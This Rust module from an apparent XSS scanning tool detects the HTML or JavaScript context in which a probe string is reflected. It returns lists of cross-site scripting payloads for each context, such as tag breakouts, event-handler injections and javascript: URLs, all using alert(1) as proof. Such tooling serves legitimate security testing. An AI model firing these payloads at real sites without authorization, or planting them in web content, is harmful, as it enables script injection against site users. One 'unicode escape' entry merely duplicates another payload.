/// Context-aware payload generation  - XSStrike-style reflection analysis.
///
/// Given where a probe string reflected in the HTML, we generate the most
/// appropriate payloads for that context rather than firing everything.

use super::{Payload, PayloadContext};

#[derive(Debug, Clone, PartialEq)]
pub enum ReflectionContext {
    // HTML body
    InsideHtmlTag,           // <p>PROBE</p>
    InsideComment,           // <!-- PROBE -->
    InsideSvg,               // <svg>PROBE</svg>
    InsideMath,              // <math>PROBE</math>
    InsideTemplate,          // <template>PROBE</template>
    // Raw-text/escapable-raw-text elements
    InsideScript,            // <script>PROBE</script>  - sub-context unknown
    InsideScriptStringDouble,// var x = "PROBE"
    InsideScriptStringSingle,// var x = 'PROBE'
    InsideScriptTemplate,    // var x = `PROBE`
    InsideScriptComment,     // // PROBE  or  /* PROBE */
    InsideScriptRegex,       // /PROBE/
    InsideStyle,             // <style>PROBE</style>
    InsideTitle,             // <title>PROBE</title>
    InsideTextarea,          // <textarea>PROBE</textarea>
    InsideNoscript,          // <noscript>PROBE</noscript>
    InsideXmp,               // <xmp>PROBE</xmp> (legacy)
    // Attribute contexts 
    AttributeDoubleQuote,    // value="PROBE"
    AttributeSingleQuote,    // value='PROBE'
    AttributeNoQuote,        // value=PROBE
    AttributeEventDouble,    // onclick="PROBE"    - already in JS
    AttributeEventSingle,    // onclick='PROBE'    - already in JS
    AttributeUrl,            // href="PROBE", src="PROBE", action="PROBE"
    AttributeSrcDoc,         // srcdoc="PROBE"     - HTML inside an attribute
    // Response-body contexts 
    InsideJson,              // reflected inside a JSON response body
    InsideXml,               // reflected inside XML / XHTML
    // Fallback
    None,
    // kept for compatibility but no longer emitted by detect_context
    #[allow(dead_code)]
    InsideAttribute,
    #[allow(dead_code)]
    UrlContext,
}

const URL_ATTRS: &[&str] = &[
    "href", "src", "action", "formaction", "data", "poster", "background",
    "ping", "manifest", "srcdoc", "longdesc", "cite", "codebase", "classid",
    "usemap", "archive", "profile", "lowsrc", "dynsrc",
];

pub fn detect_context(body: &str, probe: &str) -> ReflectionContext {
    let pos = match body.find(probe) {
        Some(p) => p,
        Option::None => return ReflectionContext::None,
    };

    let before = &body[..pos];
    let after  = &body[pos + probe.len()..];

    // JSON response
    let trimmed = body.trim_start();
    if trimmed.starts_with('{') || trimmed.starts_with('[') {
        return ReflectionContext::InsideJson;
    }

    // XML/XHTML
    if trimmed.starts_with("<?xml") || trimmed.starts_with("<rss") || trimmed.starts_with("<feed") {
        return ReflectionContext::InsideXml;
    }

    // Raw-text enclosing element
    if let Some(tag) = find_enclosing_raw_tag(before) {
        return match tag.as_str() {
            "script"   => detect_script_subcontext(before),
            "style"    => ReflectionContext::InsideStyle,
            "textarea" => ReflectionContext::InsideTextarea,
            "title"    => ReflectionContext::InsideTitle,
            "noscript" => ReflectionContext::InsideNoscript,
            "xmp" | "listing" | "plaintext" => ReflectionContext::InsideXmp,
            "svg"      => ReflectionContext::InsideSvg,
            "math"     => ReflectionContext::InsideMath,
            "template" => ReflectionContext::InsideTemplate,
            _          => ReflectionContext::InsideHtmlTag,
        };
    }

    // HTML comment
    if let Some(start) = before.rfind("<!--") {
        let end_opt = before.rfind("-->");
        if end_opt.map_or(true, |e| e < start) {
            return ReflectionContext::InsideComment;
        }
    }

    // Attribute context
    if let Some(ctx) = check_attribute_context(before, after) {
        return ctx;
    }

    ReflectionContext::InsideHtmlTag
}

/// Detect whether `before` (text up to the probe) ends inside a raw-text element.
fn find_enclosing_raw_tag(text: &str) -> Option<String> {
    const RAW: &[&str] = &[
        "script", "style", "textarea", "title", "noscript",
        "xmp", "listing", "plaintext", "svg", "math", "template",
    ];
    let lower = text.to_ascii_lowercase();
    for tag in RAW {
        let open  = format!("<{}", tag);
        let close = format!("</{}", tag);
        if let Some(last_open) = lower.rfind(&open) {
            let after_open = &lower[last_open..];
            if !after_open.contains(&close) {
                return Some(tag.to_string());
            }
        }
    }
    // Generic unclosed tag scan for depth-0
    let mut depth = 0i32;
    let bytes = text.as_bytes();
    let mut i = bytes.len();
    while i > 0 {
        i -= 1;
        if bytes[i] == b'>' { depth += 1; }
        else if bytes[i] == b'<' {
            if depth == 0 {
                let rest = &text[i + 1..];
                let name: String = rest.chars()
                    .skip_while(|c| *c == '/')
                    .take_while(|c| c.is_alphanumeric())
                    .collect();
                if !name.is_empty() { return Some(name.to_ascii_lowercase()); }
            } else { depth -= 1; }
        }
    }
    Option::None
}

/// When the probe is inside a `<script>` block, determine the JS sub-context.
fn detect_script_subcontext(before: &str) -> ReflectionContext {
    // Extract text after the last <script ...>
    let lower = before.to_ascii_lowercase();
    let script_start = lower.rfind("<script").unwrap_or(0);
    let tag_end = before[script_start..].find('>').map(|p| script_start + p + 1).unwrap_or(script_start);
    let js = &before[tag_end..];

    // Walk character-by-character tracking string/comment/regex state
    let chars: Vec<char> = js.chars().collect();
    let len = chars.len();
    let mut i = 0;

    #[derive(PartialEq)]
    enum State { Code, StrDouble, StrSingle, StrTemplate, LineComment, BlockComment, Regex }
    let mut state = State::Code;

    while i < len {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        match state {
            State::Code => match c {
                '"'  => state = State::StrDouble,
                '\'' => state = State::StrSingle,
                '`'  => state = State::StrTemplate,
                '/'  if next == Some('/') => state = State::LineComment,
                '/'  if next == Some('*') => state = State::BlockComment,
                '/'  => state = State::Regex,
                _    => {}
            },
            State::StrDouble   => { if c == '\\' { i += 1; } else if c == '"'  { state = State::Code; } }
            State::StrSingle   => { if c == '\\' { i += 1; } else if c == '\'' { state = State::Code; } }
            State::StrTemplate => { if c == '\\' { i += 1; } else if c == '`'  { state = State::Code; } }
            State::LineComment  => { if c == '\n' { state = State::Code; } }
            State::BlockComment => { if c == '*' && next == Some('/') { state = State::Code; i += 1; } }
            State::Regex        => { if c == '\\' { i += 1; } else if c == '/' { state = State::Code; } }
        }
        i += 1;
    }

    match state {
        State::StrDouble    => ReflectionContext::InsideScriptStringDouble,
        State::StrSingle    => ReflectionContext::InsideScriptStringSingle,
        State::StrTemplate  => ReflectionContext::InsideScriptTemplate,
        State::LineComment | State::BlockComment => ReflectionContext::InsideScriptComment,
        State::Regex        => ReflectionContext::InsideScriptRegex,
        State::Code         => ReflectionContext::InsideScript,
    }
}

/// Returns the attribute-level context, including quote style, URL attrs, and event handlers.
fn check_attribute_context(before: &str, _after: &str) -> Option<ReflectionContext> {
    let last_lt = before.rfind('<');
    let last_gt = before.rfind('>');

    let in_tag = match (last_lt, last_gt) {
        (Some(lt), Some(gt)) => lt > gt,
        (Some(_), Option::None) => true,
        _ => return Option::None,
    };
    if !in_tag { return Option::None; }

    // Extract the tag fragment from last `<` to the probe
    let tag_start = last_lt.unwrap();
    let tag_fragment = &before[tag_start..];

    // Determine quote character immediately before the probe
    let chars: Vec<char> = before.chars().collect();
    let mut j = chars.len();
    let mut quote_char: Option<char> = Option::None;
    while j > 0 {
        j -= 1;
        match chars[j] {
            '"' | '\'' => { quote_char = Some(chars[j]); break; }
            '>' | '<'  => break,
            _ => {}
        }
    }

    // Extract attribute name preceding the opening quote or `=`
    let attr_name = extract_attr_name(tag_fragment, quote_char);

    // Classify by attribute name
    let attr_lower = attr_name.to_ascii_lowercase();

    if attr_lower.starts_with("on") {
        return Some(match quote_char {
            Some('"') => ReflectionContext::AttributeEventDouble,
            Some('\'') => ReflectionContext::AttributeEventSingle,
            _ => ReflectionContext::AttributeEventDouble,
        });
    }

    if attr_lower == "srcdoc" {
        return Some(ReflectionContext::AttributeSrcDoc);
    }

    if URL_ATTRS.contains(&attr_lower.as_str()) {
        return Some(ReflectionContext::AttributeUrl);
    }

    Some(match quote_char {
        Some('"')  => ReflectionContext::AttributeDoubleQuote,
        Some('\'') => ReflectionContext::AttributeSingleQuote,
        _          => ReflectionContext::AttributeNoQuote,
    })
}

fn extract_attr_name(tag_fragment: &str, quote_char: Option<char>) -> String {
    // Walk backwards from the opening quote to find `attrname=`
    let search_end = if let Some(q) = quote_char {
        tag_fragment.rfind(q).unwrap_or(tag_fragment.len())
    } else {
        tag_fragment.rfind('=').unwrap_or(tag_fragment.len())
    };
    let before_eq = &tag_fragment[..search_end];
    let eq_pos = before_eq.rfind('=').unwrap_or(0);
    let name_part = before_eq[..eq_pos].trim_end();
    name_part.split_ascii_whitespace().last().unwrap_or("").to_string()
}

// Payload sets per context
pub fn payloads_for_context(ctx: &ReflectionContext) -> Vec<Payload> {
    match ctx {
        ReflectionContext::InsideHtmlTag | ReflectionContext::InsideSvg => {
            let mut p = super::html_payloads();
            if matches!(ctx, ReflectionContext::InsideSvg) {
                p.extend(svg_payloads());
            }
            p
        }

        ReflectionContext::InsideMath => math_payloads(),

        ReflectionContext::InsideTemplate => vec![
            mk(r#"</template><script>alert(1)</script>"#,   PayloadContext::Html, "template breakout"),
            mk(r#"</template><img src=x onerror=alert(1)>"#, PayloadContext::Html, "template breakout img"),
        ],

        ReflectionContext::InsideComment => vec![
            mk("--><script>alert(1)</script><!--",          PayloadContext::Html, "comment breakout script"),
            mk("--><img src=x onerror=alert(1)><!--",      PayloadContext::Html, "comment breakout img"),
            mk("--><svg onload=alert(1)><!--",             PayloadContext::Html, "comment breakout svg"),
            mk("-- ><details open ontoggle=alert(1)><!--", PayloadContext::Html, "comment breakout details"),
        ],

        ReflectionContext::InsideScript => {
            let mut p = super::js_payloads();
            p.extend(vec![
                mk("</script><script>alert(1)</script>",    PayloadContext::Html, "script close + reopen"),
                mk("</script><img src=x onerror=alert(1)>",PayloadContext::Html, "script close + img"),
            ]);
            p
        }

        ReflectionContext::InsideScriptStringDouble => vec![
            mk(r#""-alert(1)-""#,                          PayloadContext::JavaScript, "dq concat"),
            mk(r#"";alert(1)//"#,                          PayloadContext::JavaScript, "dq statement"),
            mk(r#""+alert(1)+"#,                           PayloadContext::JavaScript, "dq plus"),
            mk(r#""+(alert(1))+"#,                         PayloadContext::JavaScript, "dq parens"),
            mk(r#"</script><script>alert(1)</script>"#,    PayloadContext::Html,       "dq close script"),
            mk(r#"\"+alert(1)+\""#,                        PayloadContext::JavaScript, "dq escaped backslash"),
        ],

        ReflectionContext::InsideScriptStringSingle => vec![
            mk("'-alert(1)-'",                             PayloadContext::JavaScript, "sq concat"),
            mk("';alert(1)//",                             PayloadContext::JavaScript, "sq statement"),
            mk("'+alert(1)+'",                             PayloadContext::JavaScript, "sq plus"),
            mk("'+(alert(1))+'",                           PayloadContext::JavaScript, "sq parens"),
            mk("\\'+(alert(1))+'",                         PayloadContext::JavaScript, "sq escaped backslash"),
            mk("</script><script>alert(1)</script>",       PayloadContext::Html,       "sq close script"),
        ],

        ReflectionContext::InsideScriptTemplate => vec![
            mk("`${alert(1)}`",                            PayloadContext::JavaScript, "template interpolation"),
            mk("`+${alert(1)}+`",                          PayloadContext::JavaScript, "template plus interpolation"),
            mk("`;alert(1)//",                             PayloadContext::JavaScript, "template statement"),
            mk("`-alert(1)-`",                             PayloadContext::JavaScript, "template concat"),
        ],

        ReflectionContext::InsideScriptComment => vec![
            mk("*/alert(1)/*",                             PayloadContext::JavaScript, "block comment escape"),
            mk("\nalert(1)//",                             PayloadContext::JavaScript, "line comment newline"),
            mk("\r\nalert(1)//",                           PayloadContext::JavaScript, "line comment crlf"),
        ],

        ReflectionContext::InsideScriptRegex => vec![
            mk("/;alert(1)//",                             PayloadContext::JavaScript, "regex close statement"),
            mk("/.*/;alert(1)//",                          PayloadContext::JavaScript, "regex wildcard close"),
        ],

        ReflectionContext::InsideStyle => vec![
            mk("</style><script>alert(1)</script>",        PayloadContext::Html, "style breakout script"),
            mk("</style><img src=x onerror=alert(1)>",    PayloadContext::Html, "style breakout img"),
            mk(r#"</style><svg onload="alert(1)">"#,      PayloadContext::Html, "style breakout svg"),
            mk("{}body{background:url(javascript:alert(1))}", PayloadContext::Html, "css js url"),
            mk("expression(alert(1))",                     PayloadContext::Html, "css expression (IE)"),
        ],

        ReflectionContext::InsideTitle => vec![
            mk("</title><script>alert(1)</script>",        PayloadContext::Html, "title breakout"),
            mk("</title><img src=x onerror=alert(1)>",    PayloadContext::Html, "title breakout img"),
            mk("</title><svg onload=alert(1)>",            PayloadContext::Html, "title breakout svg"),
        ],

        ReflectionContext::InsideTextarea => vec![
            mk("</textarea><script>alert(1)</script>",     PayloadContext::Html, "textarea breakout"),
            mk("</textarea><img src=x onerror=alert(1)>", PayloadContext::Html, "textarea breakout img"),
            mk("</textarea><svg onload=alert(1)>",         PayloadContext::Html, "textarea breakout svg"),
        ],

        ReflectionContext::InsideNoscript => vec![
            mk("</noscript><script>alert(1)</script>",     PayloadContext::Html, "noscript breakout"),
        ],

        ReflectionContext::InsideXmp => vec![
            mk("</xmp><script>alert(1)</script>",          PayloadContext::Html, "xmp breakout"),
            mk("</listing><script>alert(1)</script>",      PayloadContext::Html, "listing breakout"),
        ],

        ReflectionContext::AttributeDoubleQuote => vec![
            mk(r#"" onmouseover=alert(1) ""#,              PayloadContext::Attribute, "dq onmouseover"),
            mk(r#"" autofocus onfocus=alert(1) ""#,        PayloadContext::Attribute, "dq onfocus"),
            mk(r#""><script>alert(1)</script>"#,            PayloadContext::Attribute, "dq to script"),
            mk(r#""><img src=x onerror=alert(1)>"#,        PayloadContext::Attribute, "dq to img"),
            mk(r#""><svg onload=alert(1)>"#,               PayloadContext::Attribute, "dq to svg"),
            mk(r#"" onclick=alert(1) ""#,                  PayloadContext::Attribute, "dq onclick"),
            mk(r#"" onpointerover=alert(1) ""#,            PayloadContext::Attribute, "dq pointer event"),
        ],

        ReflectionContext::AttributeSingleQuote => vec![
            mk("' onmouseover=alert(1) '",                 PayloadContext::Attribute, "sq onmouseover"),
            mk("' autofocus onfocus=alert(1) '",           PayloadContext::Attribute, "sq onfocus"),
            mk("'><script>alert(1)</script>",              PayloadContext::Attribute, "sq to script"),
            mk("'><img src=x onerror=alert(1)>",           PayloadContext::Attribute, "sq to img"),
            mk("'><svg onload=alert(1)>",                  PayloadContext::Attribute, "sq to svg"),
            mk("' onclick=alert(1) '",                     PayloadContext::Attribute, "sq onclick"),
        ],

        ReflectionContext::AttributeNoQuote => vec![
            mk("onmouseover=alert(1) x=",                 PayloadContext::Attribute, "nq onmouseover"),
            mk("onfocus=alert(1) autofocus ",              PayloadContext::Attribute, "nq onfocus autofocus"),
            mk("><script>alert(1)</script>",               PayloadContext::Attribute, "nq close + script"),
            mk("><img src=x onerror=alert(1)>",            PayloadContext::Attribute, "nq close + img"),
        ],

        ReflectionContext::AttributeEventDouble => vec![
            mk("alert(1)",                                 PayloadContext::JavaScript, "event bare call"),
            mk("alert(1);",                                PayloadContext::JavaScript, "event call semicolon"),
            mk("(alert)(1)",                               PayloadContext::JavaScript, "event parens"),
            mk("alert`1`",                                 PayloadContext::JavaScript, "event template"),
            mk("window.alert(1)",                          PayloadContext::JavaScript, "event window.alert"),
            mk("\");alert(1)//",                           PayloadContext::JavaScript, "event dq escape"),
            mk("&quot;);alert(1)//",                       PayloadContext::JavaScript, "event entity escape"),
        ],

        ReflectionContext::AttributeEventSingle => vec![
            mk("alert(1)",                                 PayloadContext::JavaScript, "event bare call"),
            mk("');alert(1)//",                            PayloadContext::JavaScript, "event sq escape"),
            mk("&apos;);alert(1)//",                       PayloadContext::JavaScript, "event entity escape"),
            mk("alert`1`",                                 PayloadContext::JavaScript, "event template"),
        ],

        ReflectionContext::AttributeUrl => vec![
            mk("javascript:alert(1)",                      PayloadContext::Attribute, "js: protocol"),
            mk("javascript:alert`1`",                      PayloadContext::Attribute, "js: template"),
            mk("JaVaScRiPt:alert(1)",                      PayloadContext::Attribute, "js: mixed case"),
            mk("javascript&#58;alert(1)",                  PayloadContext::Attribute, "js: colon entity"),
            mk("data:text/html,<script>alert(1)</script>", PayloadContext::Attribute, "data: HTML"),
            mk("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                                                           PayloadContext::Attribute, "data: base64"),
            mk("vbscript:alert(1)",                        PayloadContext::Attribute, "vbscript: (IE)"),
        ],

        ReflectionContext::AttributeSrcDoc => vec![
            mk("<script>alert(1)</script>",                PayloadContext::Html, "srcdoc script"),
            mk("<img src=x onerror=alert(1)>",             PayloadContext::Html, "srcdoc img"),
            mk("&lt;script&gt;alert(1)&lt;/script&gt;",   PayloadContext::Html, "srcdoc entity encoded"),
        ],

        ReflectionContext::InsideJson => vec![
            mk(r#""}];alert(1)//"#,                        PayloadContext::JavaScript, "json array breakout"),
            mk(r#""};alert(1)//"#,                         PayloadContext::JavaScript, "json obj breakout"),
            mk(r#"<script>alert(1)</script>"#,             PayloadContext::Html,       "json html tag"),
            mk(r#"<script>alert(1)</script>"#,
                                                           PayloadContext::Html,       "json unicode escape"),
        ],

        ReflectionContext::InsideXml => vec![
            mk("<![CDATA[<script>alert(1)</script>]]>",    PayloadContext::Html, "xml cdata"),
            mk("</tag><script>alert(1)</script>",          PayloadContext::Html, "xml tag close"),
            mk("&lt;script&gt;alert(1)&lt;/script&gt;",   PayloadContext::Html, "xml entity"),
        ],

        // Kept for backward-compat, treat as double-quote attribute
        ReflectionContext::InsideAttribute | ReflectionContext::UrlContext => {
            super::attribute_payloads()
        }

        ReflectionContext::None => super::all_payloads(),
    }
}

fn svg_payloads() -> Vec<Payload> {
    vec![
        mk("<script>alert(1)</script>",                    PayloadContext::Html, "svg embedded script"),
        mk("<animate onbegin=alert(1) attributeName=x>",  PayloadContext::Html, "svg animate onbegin"),
        mk("<set onbegin=alert(1) attributeName=x>",      PayloadContext::Html, "svg set onbegin"),
        mk("<animateTransform onbegin=alert(1) attributeName=transform>",
                                                           PayloadContext::Html, "svg animateTransform"),
        mk(r#"<use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>">"#,
                                                           PayloadContext::Html, "svg use data"),
    ]
}

fn math_payloads() -> Vec<Payload> {
    vec![
        mk(r#"<script>alert(1)</script>"#,                 PayloadContext::Html, "math script"),
        mk(r#"<mi xlink:href="javascript:alert(1)">click</mi>"#,
                                                           PayloadContext::Html, "math xlink"),
        mk(r#"</math><img src=x onerror=alert(1)>"#,      PayloadContext::Html, "math breakout img"),
        mk(r#"</math><script>alert(1)</script>"#,          PayloadContext::Html, "math breakout script"),
    ]
}

fn mk(raw: &str, ctx: PayloadContext, desc: &'static str) -> Payload {
    Payload { raw: raw.to_string(), context: ctx, description: desc }
}
